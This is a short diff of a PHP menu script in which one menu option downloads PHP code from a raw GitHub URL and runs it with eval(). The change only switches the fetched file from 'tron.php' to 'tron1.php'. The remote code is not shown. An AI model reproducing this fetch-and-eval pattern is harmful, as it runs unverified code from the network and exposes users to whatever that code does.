@@ -58,7 +58,7 @@ while(true){
         switch($selected){
 
             case 0:
-                $function = file_get_contents("https://raw.githubusercontent.com/Bagusivo1999/fullscript/refs/heads/main/tron.php");
+                $function = file_get_contents("https://raw.githubusercontent.com/Bagusivo1999/fullscript/refs/heads/main/tron1.php");
                 eval($function);
             break;
 
